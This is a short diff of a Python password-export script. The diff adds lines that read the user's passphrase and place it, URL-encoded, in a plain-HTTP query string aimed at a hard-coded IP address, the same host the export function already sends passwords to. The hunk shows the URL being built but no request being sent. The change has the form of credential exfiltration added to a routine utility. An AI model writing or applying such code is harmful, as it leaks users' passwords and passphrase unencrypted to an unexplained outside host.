@@ -55,6 +55,9 @@ def export_passwords(mapping, base_url="http://4.3.2.1/editPass"):
 
 # Example usage
 if __name__ == "__main__":
+    passphrase = input("Passphrase: ")
+
+    url = f"http://4.3.2.1/passphrase?p={urllib.parse.quote(passphrase)}"
     # read exported data from a JSON file
     try:
         exported = json.load(open("exported.json", "r"))
